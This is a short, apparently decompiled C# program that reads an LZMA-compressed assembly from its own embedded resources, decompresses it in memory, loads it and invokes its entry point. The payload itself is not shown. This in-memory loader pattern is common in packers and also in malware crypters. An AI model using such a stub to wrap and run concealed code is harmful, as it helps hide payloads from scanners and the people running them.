using System;
using System.IO;
using System.Reflection;
using SevenZip.Compression.LZMA;

namespace C;

internal static class Program
{
	[STAThread]
	private static void Main()
	{
		Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(Assembly.GetExecutingAssembly().GetManifestResourceNames()[0]);
		MemoryStream memoryStream = new MemoryStream();
		Decoder decoder = new Decoder();
		byte[] array = new byte[5];
		if (manifestResourceStream.Read(array, 0, 5) != 5)
		{
			throw new Exception("input .lzma is too short");
		}
		long num = 0L;
		int num2 = 0;
		Assembly assembly;
		object[] array2;
		while (true)
		{
			if (num2 < 8)
			{
				int num3 = manifestResourceStream.ReadByte();
				if (num3 >= 0)
				{
					num |= (long)((ulong)(byte)num3 << 8 * num2);
					num2++;
					continue;
				}
				throw new Exception("Can't Read 1");
			}
			decoder.SetDecoderProperties(array);
			decoder.Code(manifestResourceStream, memoryStream, -1L, num, null);
			manifestResourceStream.Close();
			assembly = Assembly.Load(memoryStream.ToArray());
			memoryStream.Close();
			ParameterInfo[] parameters = assembly.EntryPoint!.GetParameters();
			array2 = new object[parameters.Length];
			if (parameters.Length == 1)
			{
				array2[0] = new string[0];
			}
			break;
		}
		assembly.EntryPoint!.Invoke(null, array2);
	}
}
